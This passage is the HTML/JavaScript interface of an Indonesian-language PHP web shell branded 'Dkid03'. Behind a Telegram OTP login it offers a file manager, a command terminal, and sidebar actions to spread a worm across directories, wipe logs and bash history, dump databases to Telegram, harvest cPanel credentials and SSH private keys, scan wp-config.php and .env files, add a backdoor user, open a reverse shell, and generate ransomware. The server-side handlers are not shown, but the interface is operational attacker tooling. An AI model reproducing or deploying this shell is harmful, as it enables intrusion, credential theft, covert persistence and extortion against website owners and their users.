        .modal-close { background: none; border: none; color: var(--text-muted); font-size: 1.5rem; cursor: pointer; transition: color 0.2s; }
        .modal-close:hover { color: var(--accent); }
        .modal-body { padding: 1.5rem; }
        .text-editor {
            width: 100%; min-height: 300px; background: rgba(45, 64, 89, 0.5);
            color: var(--text); border: 1px solid var(--border); border-radius: 8px;
            padding: 1rem; font-family: monospace; resize: vertical;
        }
        .radio-group { margin: 1rem 0; }
        .radio-group label { display: block; margin-bottom: 0.5rem; cursor: pointer; }
        .radio-group input[type="radio"] { margin-right: 0.5rem; vertical-align: middle; }
        @media (max-width: 992px) {
            .sidebar { transform: translateX(-100%); width: 280px; }
            .sidebar.active { transform: translateX(0); }
            .main-content { margin-left: 0; }
        }
        .menu-toggle {
            position: fixed; top: 1rem; left: 1rem; background: var(--accent-dark);
            color: white; border: none; border-radius: 50%; width: 40px; height: 40px;
            display: flex; align-items: center; justify-content: center; cursor: pointer;
            z-index: 101; display: none;
        }
        @media (max-width: 992px) { .menu-toggle { display: flex; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-in { animation: fadeIn 0.3s ease-out; }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: rgba(45, 64, 89, 0.3); }
        ::-webkit-scrollbar-thumb { background: var(--accent-dark); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
        .file-icon { margin-right: 8px; font-size: 1.2em; }
    </style>
</head>
<body>
    <div class="background-image"></div>
    
    <?php if (!isset($_SESSION['loggedin'])): ?>
        <div class="login-container">
            <div class="login-box animate-in">
                <h1 class="login-title">Dkid03</h1>
                <?php if (!empty($loginError)): ?>
                    <div class="alert alert-danger">
                        <?= htmlspecialchars($loginError) ?>
                        <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                    </div>
                <?php endif; ?>
                <?php if (!empty($loginSuccess)): ?>
                    <div class="alert alert-success">
                        <?= htmlspecialchars($loginSuccess) ?>
                        <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                    </div>
                <?php endif; ?>
                <?php if (isset($_SESSION['otp_fallback']) && $_SESSION['otp_fallback'] === true): ?>
                    <div class="alert alert-warning">
                        📌 OTP gagal dikirim ke Telegram. Gunakan kode darurat: <strong><?= $_SESSION['otp'] ?></strong>
                    </div>
                <?php endif; ?>
                <?php if (isset($_SESSION['logout_success'])): ?>
                    <div class="alert alert-success">
                        Anda berhasil logout
                        <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                    </div>
                    <?php unset($_SESSION['logout_success']); ?>
                <?php endif; ?>
                <form method="post">
                    <div class="form-group">
                        <button type="submit" name="request_otp" class="btn btn-block">
                            <i class="fab fa-telegram"></i> Kirim OTP ke Telegram
                        </button>
                    </div>
                </form>
                <?php if (isset($_SESSION['otp'])): ?>
                <hr style="border-color: var(--border); margin: 20px 0;">
                <form method="post">
                    <div class="form-group">
                        <label for="otp">Masukkan Kode OTP</label>
                        <input type="text" id="otp" name="otp" class="form-control" placeholder="6 digit" maxlength="6" required>
                    </div>
                    <button type="submit" name="verify_otp" class="btn btn-block">Login</button>
                </form>
                <?php endif; ?>
                <div style="margin-top:15px;text-align:center;">
                </div>
            </div>
        </div>
        
    <?php else: ?>
        <div class="app-container">
            <div class="sidebar">
                <div class="sidebar-header">
                    <h2 class="sidebar-title">Dkid03 Access</h2>
                    <p class="sidebar-subtitle"><?= htmlspecialchars($currentPath) ?></p>
                </div>
                <div class="sidebar-menu">
                    <div class="menu-section">
                        <h3 class="menu-title">Operasi File</h3>
                        <a href="?" class="menu-item" style="text-decoration: none;">
                            <i class="fas fa-folder"></i> File Manager
                        </a>
                        <div class="menu-item" onclick="showModal('uploadModal')">
                            <i class="fas fa-upload"></i> Upload File
                        </div>
                        <div class="menu-item" onclick="showModal('createModal')">
                            <i class="fas fa-file"></i> Buat File Baru
                        </div>
                        <div class="menu-item" onclick="showModal('createFolderModal')">
                            <i class="fas fa-folder"></i> Buat Folder Baru
                        </div>
                        <div class="menu-item" onclick="showModal('bulkDeleteModal')">
                            <i class="fas fa-trash-alt"></i> Hapus Massal
                        </div>
                    </div>
                    <div class="menu-section">
                        <h3 class="menu-title">System</h3>
                        <a href="?terminal" class="menu-item">
                            <i class="fas fa-terminal"></i> Terminal
                        </a>
                        <div class="menu-item" onclick="runWorm()">
                            <i class="fas fa-bug"></i> Sebar Worm (Semua Direktori)
                        </div>
                        <div class="menu-item" onclick="runClean()">
                            <i class="fas fa-broom"></i> Hapus Jejak
                        </div>
                        <div class="menu-item" onclick="runDump()">
                            <i class="fas fa-database"></i> Dump Database
                        </div>
                        <div class="menu-item" onclick="runUpdate()">
                            <i class="fas fa-sync-alt"></i> Update Worm
                        </div>
                        <div class="menu-item" onclick="runHarvest()">
                            <i class="fas fa-key"></i> Harvest Credentials
                        </div>
                        <div class="menu-item" onclick="runCpanel()">
                            <i class="fas fa-server"></i> cPanel Tools
                        </div>
                        <div class="menu-item" onclick="runConfigFinder()">
                            <i class="fas fa-file-alt"></i> Cari File Sensitif
                        </div>
                        <div class="menu-item" onclick="runBackdoorUser()">
                            <i class="fas fa-user-plus"></i> Buat User Backdoor
                        </div>
                        <div class="menu-item" onclick="runReverseShell()">
                            <i class="fas fa-plug"></i> Reverse Shell
                        </div>
                        <div class="menu-item" onclick="runClearLogs()">
                            <i class="fas fa-eraser"></i> Bersihkan Log
                        </div>
                        <div class="menu-item" onclick="runSSHKeys()">
                            <i class="fas fa-key"></i> Ambil SSH Keys
                        </div>
                        <div class="menu-item" onclick="runWPScan()">
                            <i class="fab fa-wordpress"></i> Scan WP/Laravel
                        </div>
                        <div class="menu-item" onclick="runCreateRansom()">
                            <i class="fas fa-skull"></i> Buat Ransomware
                        </div>
                        <a href="?logout" class="menu-item logout-btn">
                            <i class="fas fa-sign-out-alt"></i> Logout
                        </a>
                    </div>
                </div>
            </div>
            
            <button class="menu-toggle" onclick="toggleSidebar()">
                <i class="fas fa-bars"></i>
            </button>
            
            <div class="main-content">
                <?php if (isset($_GET['terminal'])): ?>
                    <div class="terminal-container">
                        <?php $sysInfo = getSystemInfo(); ?>
                        <div class="system-info">
                            <h3><i class="fas fa-server"></i> Spesifikasi Website</h3>
                            <div class="info-grid">
                                <?php foreach ($sysInfo as $label => $value): ?>
                                <div class="info-item">
                                    <span class="info-label"><?= htmlspecialchars($label) ?>:</span>
                                    <span class="info-value"><?= htmlspecialchars($value) ?></span>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>
                        <div class="terminal-card">
                            <div class="terminal-header">
                                <span><i class="fas fa-terminal"></i> Terminal</span>
                                <div class="terminal-status">
                                    <span>Status:</span>
                                    <span class="status-indicator <?= $terminalActive ? '' : 'inactive' ?>"></span>
                                    <span><?= $terminalActive ? 'Aktif' : 'Tidak Aktif' ?></span>
                                </div>
                            </div>
                            <div class="terminal-body">
                                <?php if (!$terminalActive): ?>
                                    <div class="alert alert-danger">
                                        Terminal tidak aktif karena fungsi shell_exec dinonaktifkan.
                                    </div>
                                <?php endif; ?>
                                <div class="terminal-output"><?= htmlspecialchars($terminalOutput) ?: 'Selamat datang di terminal. Masukkan perintah di bawah.' ?></div>
                                <form method="post">
                                    <div class="terminal-input">
                                        <input type="text" name="command" class="form-control" placeholder="Contoh: ls -la" autocomplete="off" <?= $terminalActive ? '' : 'disabled' ?>>
                                        <button type="submit" name="run_command" class="btn" <?= $terminalActive ? '' : 'disabled' ?>>Jalankan</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                <?php else: ?>
                    <div class="header">
                        <center><h1 class="title">Love Dkid03</h1></center>
                    </div>
                    
                    <?php if (isset($error)): ?>
                        <div class="alert alert-danger">
                            <?= htmlspecialchars($error) ?>
                            <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                        </div>
                    <?php endif; ?>
                    
                    <?php if (isset($success)): ?>
                        <div class="alert alert-success">
                            <?= htmlspecialchars($success) ?>
                            <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                        </div>
                    <?php endif; ?>
                    
                    <div class="breadcrumb">
                        <?= breadcrumb($currentPath, $rootPath, $specialDirectories) ?>
                    </div>
                    
                    <div class="card animate-in">
                        <div class="card-header">
                            <span>Daftar File & Folder</span>
                            <span><?= count(scandir($currentPath)) - 2 ?> item</span>
                        </div>
                        <div class="card-body">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>Nama</th>
                                        <th>Tipe</th>
                                        <th>Ukuran</th>
                                        <th>Permisi</th>
                                        <th>Aksi</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php if ($currentPath !== $rootPath || !empty($specialDirectories)): ?>
                                        <tr>
                                            <td>
                                                <a href="?path=<?= urlencode(dirname($currentPath)) ?>">
                                                    <i class="file-icon fas fa-folder"></i>
                                                    <span class="folder">..</span>
                                                </a>
                                            </td>
                                            <td>Folder</td>
                                            <td>-</td>
                                            <td>-</td>
                                            <td class="action-links">-</td>
                                        </tr>
                                    <?php endif; ?>
                                    
                                    <?php
                                    $items = @scandir($currentPath) ?: [];
                                    foreach ($items as $item) {
                                        if ($item === '.' || $item === '..') continue;
                                        $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
                                        $isDir = is_dir($itemPath);
                                        $size = $isDir ? '-' : @filesize($itemPath);
                                        $sizeFormatted = $isDir ? '-' : ($size !== false ? formatSize($size) : 'Error');
                                        $perms = @fileperms($itemPath);
                                        $permsFormatted = $perms ? substr(sprintf('%o', $perms), -4) : 'Error';
                                        ?>
                                        <tr>
                                            <td>
                                                <?php if ($isDir): ?>
                                                    <a href="?path=<?= urlencode($itemPath) ?>" class="folder">
                                                        <i class="file-icon fas fa-folder"></i>
                                                        <span><?= htmlspecialchars($item) ?></span>
                                                    </a>
                                                <?php else: ?>
                                                    <span class="file">
                                                        <?php
                                                        $icon = 'fa-file';
                                                        $ext = pathinfo($item, PATHINFO_EXTENSION);
                                                        if (in_array(strtolower($ext), ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg'])) $icon = 'fa-file-image';
                                                        if (in_array(strtolower($ext), ['zip', 'rar', 'tar', 'gz', '7z'])) $icon = 'fa-file-archive';
                                                        if (in_array(strtolower($ext), ['php', 'js', 'html', 'css', 'scss', 'less'])) $icon = 'fa-file-code';
                                                        if (in_array(strtolower($ext), ['mp3', 'wav', 'ogg'])) $icon = 'fa-file-audio';
                                                        if (in_array(strtolower($ext), ['mp4', 'avi', 'mov', 'mkv'])) $icon = 'fa-file-video';
                                                        if (in_array(strtolower($ext), ['pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx'])) $icon = 'fa-file-pdf';
                                                        ?>
                                                        <i class="file-icon fas <?= $icon ?>"></i>
                                                        <span><?= htmlspecialchars($item) ?></span>
                                                    </span>
                                                <?php endif; ?>
                                            </td>
                                            <td><?= $isDir ? 'Folder' : 'File' ?></td>
                                            <td><?= $sizeFormatted ?></td>
                                            <td><?= $permsFormatted ?></td>
                                            <td class="action-links">
                                                <?php if (!$isDir && in_array(strtolower(pathinfo($item, PATHINFO_EXTENSION)), $editableExtensions)): ?>
                                                    <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')">Edit</a>
                                                <?php endif; ?>
                                                <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')">Rename</a>
                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">Download</a>
                                                <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" 
                                                   onclick="return confirm('Yakin ingin menghapus <?= htmlspecialchars($item) ?>?')"
                                                   style="color: var(--danger);">Hapus</a>
                                                <?php if (!$isDir && strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip'): ?>
                                                    <a href="?path=<?= urlencode($currentPath) ?>&action=unzip&target=<?= urlencode($item) ?>">Unzip</a>
                                                <?php endif; ?>
                                                <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')">CHMOD</a>
                                            </td>
                                        </tr>
                                    <?php } ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                <?php endif; ?>
            </div>
        </div>
        
        <!-- MODALS -->
        <div id="createModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Buat File Baru</h2>
                    <button class="modal-close" onclick="hideModal('createModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="filename">Nama File</label>
                            <input type="text" id="filename" name="name" class="form-control" required>
                            <small class="text-muted">Contoh: index.php, script.js</small>
                        </div>
                        <input type="hidden" name="type" value="file">
                        <input type="hidden" name="create" value="1">
                        <button type="submit" class="btn btn-block">Buat</button>
                    </form>
                </div>
            </div>
        </div>
        
        <div id="createFolderModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Buat Folder Baru</h2>
                    <button class="modal-close" onclick="hideModal('createFolderModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="foldername">Nama Folder</label>
                            <input type="text" id="foldername" name="name" class="form-control" required>
                            <small class="text-muted">Contoh: images, documents</small>
                        </div>
                        <input type="hidden" name="type" value="folder">
                        <input type="hidden" name="create" value="1">
                        <button type="submit" class="btn btn-block">Buat</button>
                    </form>
                </div>
            </div>
        </div>
        
        <div id="uploadModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Upload File</h2>
                    <button class="modal-close" onclick="hideModal('uploadModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post" enctype="multipart/form-data">
                        <div class="form-group">
                            <label for="fileUpload">Pilih File (bisa banyak)</label>
                            <input type="file" id="fileUpload" name="upload[]" class="form-control" multiple required>
                            <small class="text-muted">Ukuran maks: <?= ini_get('upload_max_filesize') ?></small>
                        </div>
                        <div class="radio-group">
                            <label><input type="radio" name="upload_mode" value="normal" checked> Normal (hanya folder ini)</label>
                            <label><input type="radio" name="upload_mode" value="bulk_shallow"> Bulk Shallow (folder ini + subfolder langsung)</label>
                            <label><input type="radio" name="upload_mode" value="bulk_deep"> Bulk Deep (folder ini + semua subfolder)</label>
                        </div>
                        <button type="submit" class="btn btn-block">Upload</button>
                    </form>
                </div>
            </div>
        </div>
        
        <div id="bulkDeleteModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Hapus File Massal</h2>
                    <button class="modal-close" onclick="hideModal('bulkDeleteModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="fileList">Daftar Nama File (satu per baris)</label>
                            <textarea id="fileList" name="file_list" class="form-control" rows="6" placeholder="contoh:&#10;gambar.jpg&#10;catatan.txt" required></textarea>
                        </div>
                        <div class="radio-group">
                            <label><input type="radio" name="delete_mode" value="current" checked> Normal (hanya folder ini)</label>
                            <label><input type="radio" name="delete_mode" value="shallow"> Bulk Shallow (folder ini + subfolder langsung)</label>
                            <label><input type="radio" name="delete_mode" value="deep"> Bulk Deep (folder ini + semua subfolder)</label>
                        </div>
                        <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('Yakin ingin menghapus file-file tersebut?')">Hapus</button>
                    </form>
                </div>
            </div>
        </div>
        
        <div id="editModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Edit File</h2>
                    <button class="modal-close" onclick="hideModal('editModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <textarea id="fileContent" name="content" class="text-editor"></textarea>
                        </div>
                        <input type="hidden" id="editFileName" name="file">
                        <input type="hidden" name="save_file" value="1">
                        <button type="submit" class="btn btn-block">Simpan</button>
                    </form>
                </div>
            </div>
        </div>
        
        <div id="renameModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Rename</h2>
                    <button class="modal-close" onclick="hideModal('renameModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="newName">Nama Baru</label>
                            <input type="text" id="newName" name="new_name" class="form-control" required>
                        </div>
                        <input type="hidden" id="renameTarget" name="target">
                        <input type="hidden" name="rename" value="1">
                        <button type="submit" class="btn btn-block">Rename</button>
                    </form>
                </div>
            </div>
        </div>
        
        <div id="chmodModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Ubah Permission (CHMOD)</h2>
                    <button class="modal-close" onclick="hideModal('chmodModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="permission">Permission (contoh: 0644)</label>
                            <input type="text" id="permission" name="mode" class="form-control" required>
                        </div>
                        <input type="hidden" id="chmodTarget" name="target">
                        <input type="hidden" name="action" value="chmod">
                        <button type="submit" class="btn btn-block">Ubah</button>
                    </form>
                </div>
            </div>
        </div>
        
        <script>
            function showModal(id) { document.getElementById(id).classList.add('active'); document.body.style.overflow = 'hidden'; }
            function hideModal(id) { document.getElementById(id).classList.remove('active'); document.body.style.overflow = ''; }
            function toggleSidebar() { document.querySelector('.sidebar').classList.toggle('active'); }
            
            function editFile(filename) {
                fetch('?path=<?= urlencode($currentPath) ?>&edit=' + encodeURIComponent(filename))
                    .then(response => response.text())
                    .then(data => {
                        document.getElementById('fileContent').value = data;
                        document.getElementById('editFileName').value = filename;
                        showModal('editModal');
                    })
                    .catch(error => alert('Error: ' + error.message));
            }
            
            function showRename(name = '') {
                if (name) {
                    document.getElementById('newName').value = name;
                    document.getElementById('renameTarget').value = name;
                    showModal('renameModal');
                } else alert('Pilih file atau folder yang ingin direname');
            }
            
            function showChmod(name = '', currentPerms = '') {
                if (name) {
                    document.getElementById('permission').value = currentPerms;
                    document.getElementById('chmodTarget').value = name;
                    showModal('chmodModal');
                } else alert('Pilih file atau folder yang ingin diubah permissionnya');
            }
            
            // ----- FUNGSI UNTUK FITUR DI SIDEBAR -----
            function runWorm() {
                if (confirm('Yakin ingin menyebarkan worm ke SEMUA DIREKTORI (termasuk sistem)?')) {
                    fetch('?worm=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal menjalankan worm.'));
                }
            }
            function runClean() {
                if (confirm('Hapus semua jejak akses (log, history, timestamp)?')) {
                    fetch('?clean=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal membersihkan jejak.'));
                }
            }
            function runDump() {
                if (confirm('Lakukan dump database? (Hasil akan dikirim ke Telegram)')) {
                    fetch('?dumpdb=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal melakukan dump database.'));
                }
            }
            function runUpdate() {
                if (confirm('Cek dan update worm ke versi terbaru?')) {
                    fetch('?update=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal mengecek update.'));
                }
            }
            function runHarvest() {
                if (confirm('Cari kredensial cPanel (accesshash, token, password di file konfigurasi)?')) {
                    fetch('?harvest=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal melakukan harvesting.'));
                }
            }
            function runCpanel() {
                var action = prompt("Pilih aksi cPanel:\n1. List akun\n2. Buat akun (format: create username domain password plan)\n3. Ubah password (format: passwd username passwordbaru)\n4. Backup akun (format: backup username)\n5. Hapus akun (format: delete username [keep])\n\nMasukkan perintah (contoh: list)");
                if (action) {
                    var parts = action.split(' ');
                    var cmd = parts[0];
                    var user = parts[1] || '';
                    var extra = parts.slice(2).join(' ');
                    fetch('?cpanel=1&action=' + encodeURIComponent(cmd) + '&user=' + encodeURIComponent(user) + '&extra=' + encodeURIComponent(extra))
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal menjalankan perintah cPanel.'));
                }
            }
            function runConfigFinder() {
                if (confirm('Cari file sensitif (config, backup, dll) di semua domain?')) {
                    fetch('?configfinder=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal mencari file sensitif.'));
                }
            }
            function runBackdoorUser() {
                var user = prompt('Masukkan username untuk user backdoor:');
                if (user) {
                    var pass = prompt('Masukkan password untuk user ' + user + ':');
                    if (pass) {
                        fetch('?backdooruser=1&user=' + encodeURIComponent(user) + '&pass=' + encodeURIComponent(pass))
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(() => alert('Gagal membuat user backdoor.'));
                    }
                }
            }
            function runReverseShell() {
                var action = prompt("Pilih aksi:\n1. Start (ip port)\n2. Stop (port)\n3. Status\n\nMasukkan angka:");
                if (action == '1') {
                    var ip = prompt('Masukkan IP target:');
                    if (ip) {
                        var port = prompt('Masukkan port:');
                        if (port) {
                            fetch('?reverseshell=1&action=start&ip=' + encodeURIComponent(ip) + '&port=' + encodeURIComponent(port))
                                .then(response => response.text())
                                .then(data => alert(data))
                                .catch(() => alert('Gagal start reverse shell.'));
                        }
                    }
                } else if (action == '2') {
                    var port = prompt('Masukkan port yang ingin dihentikan:');
                    if (port) {
                        fetch('?reverseshell=1&action=stop&port=' + encodeURIComponent(port))
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(() => alert('Gagal stop reverse shell.'));
                    }
                } else if (action == '3') {
                    fetch('?reverseshell=1&action=status')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal mendapatkan status.'));
                } else {
                    alert('Aksi tidak dikenal.');
                }
            }
            function runClearLogs() {
                if (confirm('Bersihkan semua log dan history (termasuk /var/log, .bash_history, .mysql_history)?')) {
                    fetch('?clearlogs=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal membersihkan log.'));
                }
            }
            function runSSHKeys() {
                if (confirm('Ambil semua SSH keys (private keys, authorized_keys) dari semua user?')) {
                    fetch('?sshkeys=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal mengambil SSH keys.'));
                }
            }
            function runWPScan() {
                if (confirm('Scan WordPress/Laravel untuk mencari kredensial (wp-config.php, .env)?')) {
                    fetch('?wpscan=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal melakukan scan.'));
                }
            }
            function runCreateRansom() {
                if (confirm('Yakin ingin membuat file ransomware R.php dari repository?')) {
                    fetch('?create_ransom=1')
                        .then(response => response.text())
                        .then(data => alert(data))
                        .catch(() => alert('Gagal membuat ransomware.'));
                }
            }
            // ----- AKHIR FUNGSI -----
            
            window.onclick = function(event) {
                document.querySelectorAll('.modal').forEach(modal => {
                    if (event.target === modal) hideModal(modal.id);
                });
            }
            
            <?php if (isset($_GET['edit'])): ?>
                <?php
                $file = $_GET['edit'];
                $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
                if (file_exists($filePath) && is_file($filePath) && isSafePath($filePath, $rootPath, $specialDirectories) && 
                    in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $editableExtensions)) {
                    $content = @file_get_contents($filePath);
                } else $content = '';
                ?>
                document.addEventListener('DOMContentLoaded', function() {
                    document.getElementById('fileContent').value = <?= json_encode($content) ?>;
                    document.getElementById('editFileName').value = <?= json_encode($file) ?>;
                    showModal('editModal');
                });
            <?php endif; ?>
            
            document.getElementById('chmodModal')?.querySelector('form').addEventListener('submit', function(e) {
                if (!/^[0-7]{3,4}$/.test(document.getElementById('permission').value)) {
                    e.preventDefault();
                    alert('Format permission tidak valid. Gunakan 3-4 digit angka octal');
                }
            });
        </script>
    <?php endif; ?>
</body>
</html>